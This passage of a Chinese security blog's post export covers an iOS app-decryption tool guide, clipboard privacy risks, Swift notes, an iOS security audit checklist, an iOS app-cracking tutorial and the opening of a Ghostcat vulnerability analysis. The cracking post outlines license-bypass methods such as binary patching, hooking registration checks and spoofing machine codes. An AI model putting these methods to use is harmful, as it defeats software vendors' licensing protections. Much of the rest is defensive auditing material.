rel="noopener">issue</a>。其实在<code>requirements.txt</code>文件中也写明了<code>prompt</code>包，因此也不用手动单独安装<code>prompt</code>。</p></li><li><p>步骤三：下载frida-ios-dump脚本，安装依赖</p><ul><li><p>使用Python2的脚本：<a href="https://github.com/AloneMonkey/frida-ios-dump" target="_blank" rel="noopener">Link</a></p></li><li><p>使用Python3的脚本：<a href="https://github.com/AloneMonkey/frida-ios-dump/tree/3.x" target="_blank" rel="noopener">Link</a>    注意：该版本的脚本目前容易出现<a href="https://github.com/AloneMonkey/frida-ios-dump/issues/97" target="_blank" rel="noopener">TypeError: can’t concat str to bytes</a>报错，因此推荐使用Python2版本的</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/AloneMonkey/frida-ios-dump.git</span><br><span class="line">$ <span class="built_in">cd</span> frida-ios-dump</span><br><span class="line">$ pip install -r requirements.txt --upgrade</span><br></pre></td></tr></table></figure><p>注意：如果设备的连接信息（e.g. ssh默认的连接密码alpine）已经修改，要修改脚本中对应的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ vim dump.py</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment"># 手机连接配置</span></span><br><span class="line">  User = <span class="string">'root'</span></span><br><span class="line">  Password = <span class="string">'alpine'</span></span><br><span class="line">  Host = <span class="string">'localhost'</span> <span class="comment"># 此处不用修改</span></span><br><span class="line">  Port = 2222</span><br></pre></td></tr></table></figure></li><li><p>通过USB使用SSH连接设备</p><p>参考：<a href="http://blog.okeyang.com/blog/2013/09/16/iproxy-tong-guo-usbshi-yong-sshlian-jie-iosshe-bei/" target="_blank" rel="noopener">Link</a></p><p>该脚本使用SSH连接进行操作（基于Frida），但使用Wi-Fi的SSH容易不稳定，因此可以使用<code>iproxy</code>工具将SSH的22端口转发到一个本地端口2222，再通过USB连接，会更加稳定。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># USB连接你的Mac，新开一个命令行窗口，进行转发</span></span><br><span class="line">$ iproxy 2222 22</span><br></pre></td></tr></table></figure></li><li><p>使用脚本</p><p>默认使用USB连接，需要进行端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ./dump.py -h</span><br><span class="line">usage: dump.py [-h] [-l] [-o OUTPUT_IPA] [-H SSH_HOST] [-p SSH_PORT]</span><br><span class="line">               [-u SSH_USER] [-P SSH_PASSWORD]</span><br><span class="line">               [target]</span><br><span class="line"></span><br><span class="line">frida-ios-dump (by AloneMonkey v2.0)</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                Bundle identifier or display name of the target app</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -l, --list            List the installed apps</span><br><span class="line">  -o OUTPUT_IPA, --output OUTPUT_IPA</span><br><span class="line">                        Specify name of the decrypted IPA</span><br><span class="line">  -H SSH_HOST, --host SSH_HOST</span><br><span class="line">                        Specify SSH hostname</span><br><span class="line">  -p SSH_PORT, --port SSH_PORT</span><br><span class="line">                        Specify SSH port</span><br><span class="line">  -u SSH_USER, --user SSH_USER</span><br><span class="line">                        Specify SSH username</span><br><span class="line">  -P SSH_PASSWORD, --password SSH_PASSWORD</span><br><span class="line">                        Specify SSH password</span><br></pre></td></tr></table></figure></li></ul><h3 id="故障备忘"><a href="#故障备忘" class="headerlink" title="故障备忘"></a>故障备忘</h3><p>第一次执行后报错</p><blockquote><p>unable to attach to the specified process</p></blockquote><p>原来是因为手机没有安装Frida.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[0] <a href="https://www.exchen.net/ios-hacker-frida-ios-dump.html" target="_blank" rel="noopener">https://www.exchen.net/ios-hacker-frida-ios-dump.html</a></p><p>[1] <a href="https://www.jianshu.com/p/79d2d9f3958c" target="_blank" rel="noopener">https://www.jianshu.com/p/79d2d9f3958c</a></p><p>[2] <a href="https://www.exchen.net/ios-hacker-frida-ios-dump.html" target="_blank" rel="noopener">https://www.exchen.net/ios-hacker-frida-ios-dump.html</a></p><p>[3] <a href="https://www.jianshu.com/p/4aee1c07d1da" target="_blank" rel="noopener">https://www.jianshu.com/p/4aee1c07d1da</a></p><p>[4] <a href="http://blog.okeyang.com/blog/2013/09/16/iproxy-tong-guo-usbshi-yong-sshlian-jie-iosshe-bei/" target="_blank" rel="noopener">http://blog.okeyang.com/blog/2013/09/16/iproxy-tong-guo-usbshi-yong-sshlian-jie-iosshe-bei/</a> </p><p>[5] <a href="https://blog.aberlt.com/2017/12/14/%E8%AE%B0%E7%A0%B8%E5%A3%B3%E5%B7%A5%E5%85%B7-frida-ios-dump-%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">https://blog.aberlt.com/2017/12/14/%E8%AE%B0%E7%A0%B8%E5%A3%B3%E5%B7%A5%E5%85%B7-frida-ios-dump-%E7%9A%84%E4%BD%BF%E7%94%A8/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iOS安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统剪贴板中的安全问题</title>
      <link href="/2020/02/27/%E7%B3%BB%E7%BB%9F%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%AE%89%E5%85%A8/"/>
      <url>/2020/02/27/%E7%B3%BB%E7%BB%9F%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="系统剪贴板中的安全问题"><a href="#系统剪贴板中的安全问题" class="headerlink" title="系统剪贴板中的安全问题"></a>系统剪贴板中的安全问题</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天看到一篇文章，<a href="https://mp.weixin.qq.com/s/cOouX4qJhqDfecA56iYWhw" target="_blank" rel="noopener">《流氓应用隐私收割利器：苹果设备剪贴板泄漏GPS信息隐患分析》</a>,提出了一种不需要获取定位权限即可获取到用户当前位置的方法。</p><p>但是在梳理攻击流程的时候</p><p>发现，这种攻击的危害性并不像文章中所写的那么严重。但也第一次让我看到系统剪贴板中可能存在的许多安全“隐患”。因此整理一下，与系统剪贴板相关的安全研究。</p><h2 id="1-Apple设备剪贴板隐私信息泄露（未确认）"><a href="#1-Apple设备剪贴板隐私信息泄露（未确认）" class="headerlink" title="1.Apple设备剪贴板隐私信息泄露（未确认）"></a>1.Apple设备剪贴板隐私信息泄露（未确认）</h2><p>具体分析参考<a href="https://mp.weixin.qq.com/s/cOouX4qJhqDfecA56iYWhw" target="_blank" rel="noopener">《流氓应用隐私收割利器：苹果设备剪贴板泄漏GPS信息隐患分析》</a></p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>对于Apple设备，用户需要授予“相机”应用访问位置服务的权限，并使用”相机”应用拍摄照片（照片图像嵌入EXIF属性，其中包含GPS坐标）</li><li>用户将照片复制到剪贴板（剪贴板中有照片图像）</li><li>用户安装了所谓的流氓软件（iOS和iPadOS应用程序可以不受限制地访问系统内的通用剪贴板，流氓软件会通过自动读取剪贴板中包含位置信息的图片，来获取敏感数据）</li><li>用户在复制了照片后打开流氓软件，或利用窗口小部件（Widgets）使得流氓软件在前台处于活动状态（iOS和iPadOS设计为<strong>仅当应用程序在前台处于活动状态时才允许应用程序读取剪贴板</strong>）</li></ul><p>综上看来，攻击面似乎比较窄。</p><h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><p>[1] Apple文档，UIPastedboard, <a href="https://developer.apple.com/documentation/uikit/uipasteboard" target="_blank" rel="noopener">https://developer.apple.com/documentation/uikit/uipasteboard</a></p><h3 id="2-剪贴板挟持"><a href="#2-剪贴板挟持" class="headerlink" title="2.剪贴板挟持"></a>2.剪贴板挟持</h3><p>参考文章：<a href="http://blogs.360.cn/post/analysis_of_Clipper.html" target="_blank" rel="noopener">《剪贴板幽灵：币圈的神偷圣手》</a></p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200227170255.png"></p><p>图：主要的劫持流程图</p><h2 id="加强方案"><a href="#加强方案" class="headerlink" title="加强方案"></a>加强方案</h2><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>Android Q 版本后，只有默认输入法(IME)或者是目前处于焦点的应用, 才能访问到剪贴板数据。不过用户可以手动设置默认输入法，但应用在后台已经不能监听剪贴板数据了。</p><p>参考Android Q剪贴板适配方案：<a href="https://juejin.im/post/5d5f98a8f265da03986bfafb" target="_blank" rel="noopener">Link</a></p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>利用xlip，参考：<a href="https://kknews.cc/zh-hk/tech/n5n634g.html" target="_blank" rel="noopener">Link</a>，非官方，不保证方案的安全性</p><h2 id="相关资料-1"><a href="#相关资料-1" class="headerlink" title="相关资料"></a>相关资料</h2><p>[1] Chris Thornton, <a href="http://www.clipboardextender.com/defective-apps/clipboard-virus-not-exactly-but-still-dangerous" target="_blank" rel="noopener">Clipboard Virus? Not exactly, but still dangerous.</a>, </p><p>[2] StackExchange, <a href="https://security.stackexchange.com/questions/39118/how-can-i-protect-myself-from-this-kind-of-clipboard-abuse" target="_blank" rel="noopener">How can I protect myself from this kind of clipboard abuse?</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swift学习笔记_0</title>
      <link href="/2020/02/27/Swift%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-0/"/>
      <url>/2020/02/27/Swift%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-0/</url>
      
        <content type="html"><![CDATA[<h1 id="Swift学习笔记-0"><a href="#Swift学习笔记-0" class="headerlink" title="Swift学习笔记_0"></a>Swift学习笔记_0</h1><p>Swift语言的核心就是变量variable和函数function</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h3><ul><li>字符串<ul><li>字符串</li><li><code>var str: String = &quot;Hello World&quot;</code></li><li>冒号 + 空格 + 类型，可以省略（类型推断），但推荐写</li></ul></li><li>数字<ul><li>整数</li><li><code>var price: Int = 1000</code></li><li><code>let price: Int = 1000</code>  let表示常量，不变的</li><li>小数</li></ul></li><li>布尔值<ul><li><code>var flag: Bool  = false</code></li></ul></li></ul><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ul><li>集合</li></ul><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> animalsArray: <span class="type">Array</span> = [<span class="string">"dog"</span>, <span class="string">"cat"</span>, <span class="string">"lion"</span>]</span><br></pre></td></tr></table></figure><ul><li><p>append, remove</p></li><li><p>排序</p><p><code>.sorted()</code></p></li><li><p>转换</p><p><code>.map</code></p><p>相当于是遍历一个集合对象，将相同的操作应用于该集合的每一个对象，做一个一一映射的关系。</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200227124830.png" style="zoom:33%;" /><p>详细的介绍参考：<a href="https://www.jianshu.com/p/1b4a8b4517bd" target="_blank" rel="noopener">Swift高级函数</a></p></li></ul><h3 id="自定义类型"><a href="#自定义类型" class="headerlink" title="自定义类型"></a>自定义类型</h3><p>其实就相当于变量、函数的内部聚合，类似结构体。</p><p>注意：这是作为一种变量类型，而不是类。<a href="https://www.jianshu.com/p/596864f2c672" target="_blank" rel="noopener">Swift 中的 struct 和 class</a></p><ul><li>关键字：struct</li><li>外部组合：protocal，类比Java中的接口</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="常规形式"><a href="#常规形式" class="headerlink" title="常规形式"></a>常规形式</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数头：输入， 输出</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bigger</span><span class="params">(varA: Int, varB: Int)</span></span> -&gt; <span class="type">Int</span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">    <span class="keyword">if</span>(varA &gt; varB) &#123;</span><br><span class="line">        <span class="keyword">return</span> varA</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> varB</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><p>即广泛使用的类型，使用时需要两部分：泛型的定义 + 占位符T</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// T为占位符，函数名后加尖括号对其作泛型定义</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">biggerT</span>&lt;T: Comparable&gt;<span class="params">(varA: T, varB: T)</span></span> -&gt; <span class="type">T</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(varA &gt; varB) &#123;</span><br><span class="line">        <span class="keyword">return</span> varA</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> varB</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200227141120.png" style="zoom:50%;" />]]></content>
      
      
      
        <tags>
            
            <tag> Swift </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iOS应用安全概要</title>
      <link href="/2020/02/26/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A6%82%E8%A6%81/"/>
      <url>/2020/02/26/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A6%82%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<h1 id="iOS应用安全概要"><a href="#iOS应用安全概要" class="headerlink" title="iOS应用安全概要"></a>iOS应用安全概要</h1><h2 id="安全问题归纳"><a href="#安全问题归纳" class="headerlink" title="安全问题归纳"></a>安全问题归纳</h2><h3 id="1-敏感信息泄露"><a href="#1-敏感信息泄露" class="headerlink" title="1.敏感信息泄露"></a>1.敏感信息泄露</h3><p>用户名账户、密码；登入Token；密码锁等</p><h4 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h4><ul><li><p>文件存储</p><ul><li>威胁<ul><li>NSUserDefaults</li><li>未加密的数据库形式</li><li>APP的数据目录访问权限</li></ul></li><li>审计方法<ul><li>iFunbox等可访问文件系统的工具</li><li>PlistEdit、SqliteBrowser</li></ul></li><li>解决方案<ul><li>重要数据存储到Keychain中（iOS钥匙串Keychains安全机制参考：<a href="https://juejin.im/post/5bf2a942e51d4546db6bd139" target="_blank" rel="noopener">链接</a>）<ul><li>Keychain实质上是一个安全的数据库</li></ul></li><li>数据库文件可设置sqlite key进行数据库加密</li></ul></li></ul></li><li><p>网络请求</p><ul><li>主要考虑中间人攻击的场景</li><li>威胁<ul><li>网络请求中可能包含敏感信息的数据（明文）</li></ul></li><li>审计方法<ul><li>BurpSuite、Charles，观察APP网络请求</li></ul></li><li>解救方案<ul><li>禁止明文传输敏感数据，Hash加密</li><li>重要数据HTTPS传输</li></ul></li></ul></li><li><p>日志输出</p><ul><li>威胁<ul><li>一般不会有太大问题，但使用NSLog或第三方库Log中可能打印调试信息，日志中输出敏感数据或函数调用流程等，从而辅助了攻击者进行应用程序逆向，造成危害</li></ul></li><li>审计方法<ul><li>idevicesyslog from libimobiledevice</li></ul></li><li>解决方案<ul><li>使用宏来控制开发版本和发布版本的日志输出</li></ul></li></ul></li><li><p>后台快照</p><ul><li><p>APP被切换至后台时会保存当前界面的快照，若界面上包含敏感信息，可导致数据泄露</p></li><li><p>审计方法</p><ul><li>Library/Caches/snapshots中的快照图片</li></ul></li><li><p>解决方案</p><ul><li>程序别切换至后台时，通过UIApplicationDelegate进行处理</li><li>TODO，模糊化处理; e.g. signal</li></ul></li></ul></li></ul><h3 id="2-数据加密"><a href="#2-数据加密" class="headerlink" title="2.数据加密"></a>2.数据加密</h3><h4 id="问题点-1"><a href="#问题点-1" class="headerlink" title="问题点"></a>问题点</h4><ul><li>加密算法<ul><li>威胁<ul><li>加密算法自身安全性问题（自定义的简单加密算法或RC4）</li></ul></li><li>审计方法<ul><li>对APP进行逆向，分析对加密功能的类或方法的调用流程等</li></ul></li><li>解决方案<ul><li>尽量避免使用自定义的加密算法</li><li>使用AES、DES等算法 ？TODO存疑，iOS最流行使用什么？</li><li>使用非对称加密，但不能一概而论TODO</li></ul></li></ul></li><li>算法关键数据<ul><li>威胁<ul><li>算法KEY生成或存储方式不当，可逆向获取</li><li>对称加密的KEY硬编码与程序中。可能会造成横向越权。</li></ul></li><li>审计方法<ul><li>逆向分析、审计本地文件是否存放相关数据</li></ul></li><li>解决方法<ul><li>以设备相关的信息作为基础（保证鉴权和独一）生成KEY。e.g. IDFV TODO <a href="https://www.jianshu.com/p/b810d7e007ad" target="_blank" rel="noopener">链接</a></li></ul></li></ul></li></ul><h3 id="3-网络交互"><a href="#3-网络交互" class="headerlink" title="3.网络交互"></a>3.网络交互</h3><p>中间人攻击</p><h4 id="问题点-2"><a href="#问题点-2" class="headerlink" title="问题点"></a>问题点</h4><ul><li><p>HTTP&amp;HTTPS</p><ul><li>敏感信息HTTP传输，存在MITM风险</li><li>HTTPS传输，但在APP中未进行服务器证书校验，同样可能存在MITM风险</li></ul></li><li><p>审计方法</p><ul><li>Burpsuite，Charles</li></ul></li><li><p>解决方案</p><ul><li>使用HTTPS时，客户端必须进行服务端证书校验</li><li>在无法使用HTTPS传输吗，只能使用HTTP的情况下，HTTP要避免明文加密，在必要的情况下使用非对称加密</li></ul></li><li><p>web View &amp; JavaScript</p><ul><li><p>通过JS调用APP的原生接口</p></li><li><p>来源</p><ul><li>UIWebView &amp; WKWebView &amp; WebViewJavascriptBridge</li></ul></li><li><p>威胁</p><ul><li>WebView注册获取信息（GPS）的接口，恶意网页通过JS调用获取信息</li><li>WebView注册的Native接口实现有缺陷，调用恶意JS代码导致APP崩溃</li></ul></li><li><p>审计方法</p><ul><li>逆向APP，分析相关的类方法调用，测试注册的接口</li></ul></li><li><p>解决方案</p><ul><li>使用Safari来打开链接</li><li>尽量不要为JS注册获取敏感信息的接口</li><li>使用WebView加载页面并设计JS调用时，对调用的接口进行检查，设置调用的黑/白名单</li></ul></li></ul></li></ul><h3 id="4-第三方库"><a href="#4-第三方库" class="headerlink" title="4.第三方库"></a>4.第三方库</h3><p>第三方库存在的安全隐患。TODO去看一些存在问题的第三方库的报告。</p><h4 id="AFNetworking"><a href="#AFNetworking" class="headerlink" title="AFNetworking"></a>AFNetworking</h4><ul><li><p>低于2.5.3版本存在安全隐患</p></li><li><p>通过加载dylib对AFNetworking进行测试</p></li></ul><h4 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h4><ul><li>低于2.8.5版本存在文件读取漏洞</li></ul><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ul><li>实施更新第三方库</li><li>或者实施跟进修补方案</li></ul><h3 id="5-Bug"><a href="#5-Bug" class="headerlink" title="5.Bug"></a>5.Bug</h3><h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><ul><li>扫描畸形二维码，导致APP崩溃</li></ul><h4 id="功能逻辑"><a href="#功能逻辑" class="headerlink" title="功能逻辑"></a>功能逻辑</h4><ul><li>APP原有旧数据存储于Keychain，卸载后未完全清除，重新安装后直接登入成功，绕过了登入</li></ul><h2 id="安全审计辅助工具"><a href="#安全审计辅助工具" class="headerlink" title="安全审计辅助工具"></a>安全审计辅助工具</h2><h3 id="工具实现"><a href="#工具实现" class="headerlink" title="工具实现"></a>工具实现</h3><ul><li>Hook关键点   TODO学习HOOK概念，iOSHOOK技术，对比Android HOOK技术<ul><li>NSData</li><li>NSFileManager<ul><li>经常用于存储临时数据</li><li>拦截所有的文件读写，判断是否有敏感数据</li></ul></li><li>sqlite3</li><li>NSUserDefaults</li><li>CCHmac, CCHash</li><li>CCCrypt<ul><li>明文</li><li>使用的算法</li><li>iv</li><li>Key</li><li>结合以上进行重要数据流程判别</li></ul></li><li>…</li></ul></li><li>记录相关数据</li><li>敏感数据检查<ul><li>比如对JSON文件<ul><li>网络请求中大量存在JSON数据，可以进行拦截检查</li><li>e.g. cookie信息</li></ul></li></ul></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] iOS应用审计，王兆威，<a href="https://www.ichunqiu.com/course/53965" target="_blank" rel="noopener">https://www.ichunqiu.com/course/53965</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iOS安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iOS应用破解初探</title>
      <link href="/2020/02/26/iOS%E5%BA%94%E7%94%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2/"/>
      <url>/2020/02/26/iOS%E5%BA%94%E7%94%A8%E7%A0%B4%E8%A7%A3%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="iOS应用破解初探"><a href="#iOS应用破解初探" class="headerlink" title="iOS应用破解初探"></a>iOS应用破解初探</h1><h2 id="1-常用破解工具"><a href="#1-常用破解工具" class="headerlink" title="1.常用破解工具"></a>1.常用破解工具</h2><ul><li><p>Dumpdecrypted - APP解密 </p></li><li><p>通常为第一步</p></li><li><p>IDA - 静态反编译</p></li><li><p>LLDB - 动态调试</p><ul><li>Apple官方的调试工具</li></ul></li><li><p>Cycript - 动态调试/UI分析</p><ul><li>基于JS</li><li>动态打印、分析程序结构</li><li>通常用于UI分析</li></ul></li><li><p>IHex - 二进制修改</p><ul><li><p>对二进制进行patch</p></li><li><p>patch是什么意思？</p><blockquote><p>To patch a file means to modify it, with the connotation that the modification is generally small.</p></blockquote></li></ul></li><li><p>Classdump - 头文件提取</p><ul><li>便于对类名和方法名进行搜索</li></ul></li><li><p>Burpsuite/WireShark - 抓包</p><ul><li>大部分验证通过HTTP/HTTPS</li><li>socket等可以通过WireShark</li></ul></li></ul><h2 id="2-破解步骤与方法"><a href="#2-破解步骤与方法" class="headerlink" title="2.破解步骤与方法"></a>2.破解步骤与方法</h2><h3 id="常规步骤"><a href="#常规步骤" class="headerlink" title="常规步骤"></a>常规步骤</h3><p>以下为一个常规步骤</p><ul><li>判断授权方式（Burpsuite/Shark）<ul><li>用抓包工具判断APP的授权方式</li></ul></li><li>APP解密（Dumpdecrypted）<ul><li>对二进制文件进行解密</li><li>dump出头文件，利于查找</li></ul></li><li>二进制分析（IDA/LLDB/Cycript）<ul><li>通过动静态结合的调试方式</li><li>找到关键破解点</li></ul></li><li>二进制修改/HOOK（IHex）<ul><li>进行破解</li><li>Patch二进制</li><li>HOOK注入</li></ul></li><li>签名重打包</li></ul><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><ul><li>UI回溯法<ul><li>根据UI显示的授权关键字如“正式版”、“试用版”、“未授权”等，通过Cycript进行UI分析，一步步回溯到上层授权判断的关键点进行修改和破解</li></ul></li><li>特征函数法<ul><li>根据授权验证所需的特定函数进行定位。</li><li>e.g. socket验证所需的固定函数connect, recv等函数，定位到程序发送、接收数据等位置。</li><li>e.g. 部分APP将授权码写入keychain，定位keychain读写函数</li></ul></li><li>类名检索法<ul><li>代码的类名函数通常具有可读性，通过classdump导出头文件检索如authorize等关键文件</li><li>定位关键字</li></ul></li><li>顺序跟踪法<ul><li>大多数授权校验和机器码发送位于程序初始化，在IDA中从函数初始化开始跟踪寻址</li></ul></li><li>栈跟踪法<ul><li>断点关键函数，根据调用栈查找验证流程</li></ul></li></ul><h2 id="3-实战案例"><a href="#3-实战案例" class="headerlink" title="3.实战案例"></a>3.实战案例</h2><h3 id="实验一：网络验证破解"><a href="#实验一：网络验证破解" class="headerlink" title="实验一：网络验证破解"></a>实验一：网络验证破解</h3><ul><li><p>http/https/socket</p></li><li><p>总的思路：通过抓包工具，找到协议，跟踪请求的函数（跟着IDA反编译后的代码），分析函数对数据的处理流程。</p></li><li><p>步骤1：通过BurtpSuite截包，分析协议，发送请求</p></li><li><p>步骤2：打开IDA查询host及HTTP发包相关函数，使用了第三方网络框架AFNetworking发送请求</p></li><li><p>步骤3：分析请求get后对response返回值的处理函数</p></li></ul><p>如何破解？</p><ul><li>爆破<ul><li>patch二进制，修改对get请求返回值的判断</li></ul></li><li>注册机</li></ul><h3 id="实验二：本地验证的破解"><a href="#实验二：本地验证的破解" class="headerlink" title="实验二：本地验证的破解"></a>实验二：本地验证的破解</h3><p>以破解一个棋牌APP为例，正版/试用版。</p><ul><li>步骤1：分析UI结构，关键字分析</li><li>步骤2：classdump出头文件，找出UI调用，跟进函数调用流程</li><li>步骤3：梳理验证流程，明确验证为正版的代码流程</li></ul><p>如何破解？</p><ul><li>Hook，修改注册状态</li><li>修改数据库取值后对注册码的判断，直接修改逻辑判断、</li></ul><h3 id="实验三：机器码验证伪造"><a href="#实验三：机器码验证伪造" class="headerlink" title="实验三：机器码验证伪造"></a>实验三：机器码验证伪造</h3><ul><li>utsname</li><li>UIDevice</li><li>MGCopyAnswer</li><li>IORegistryEntryCreateCFProperty</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] iOS应用破解，刘羊梓， <a href="https://www.ichunqiu.com/course/53977" target="_blank" rel="noopener">https://www.ichunqiu.com/course/53977</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iOS安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一洞】幽灵猫漏洞(CVE-2020-1938)</title>
      <link href="/2020/02/26/CVE-2020-1938/"/>
      <url>/2020/02/26/CVE-2020-1938/</url>
      
        <content type="html"><![CDATA[<h1 id="【每日一洞】幽灵猫漏洞-CVE-2020-1938"><a href="#【每日一洞】幽灵猫漏洞-CVE-2020-1938" class="headerlink" title="【每日一洞】幽灵猫漏洞(CVE-2020-1938)"></a>【每日一洞】幽灵猫漏洞(CVE-2020-1938)</h1><h2 id="自己的总结"><a href="#自己的总结" class="headerlink" title="自己的总结"></a>自己的总结</h2><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/%E5%B9%BD%E7%81%B5%E7%8C%AB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%B5%81%E7%A8%8B%E5%9B%BE.png"></p><p>总结：要研究一个开源软件的漏洞，一定要在全面阅读其代码的基础上，熟悉流程。找 <em>*可控的 + 原有的</em>，利用短板效应和组合拳实现突破。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="Tomcat-AJP-Connector"><a href="#Tomcat-AJP-Connector" class="headerlink" title="Tomcat AJP Connector"></a>Tomcat AJP Connector</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225160417.png"></p><p>Connector是什么？</p><ul><li>一个监听外部数据，接收用户请求，转发到下游（处理具体业务逻辑）Tomcat的连接器。</li></ul><p>http -&gt; ajp -&gt;下游tomcat</p><h3 id="使用Tomcat的一个Web服务网络架构"><a href="#使用Tomcat的一个Web服务网络架构" class="headerlink" title="使用Tomcat的一个Web服务网络架构"></a>使用Tomcat的一个Web服务网络架构</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225160556.png"></p><p>ajp_pass 使用 ajp 协议</p><p>Proxy_pass 使用 http 协议</p><h3 id="AJP协议分析"><a href="#AJP协议分析" class="headerlink" title="AJP协议分析"></a>AJP协议分析</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200225160734.png"></p><p>图：AJP协议</p><p>注意上图中圈起来的重要内容。</p><p>思考：atteibutes如果可以任意设置，会有什么作用？</p><p>Attributes包括以下三个</p><ul><li>javax.servlet.include.request_uri</li><li>javax.servlet.include.path_info</li><li>javax.servlet.include.servlet_path</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><img 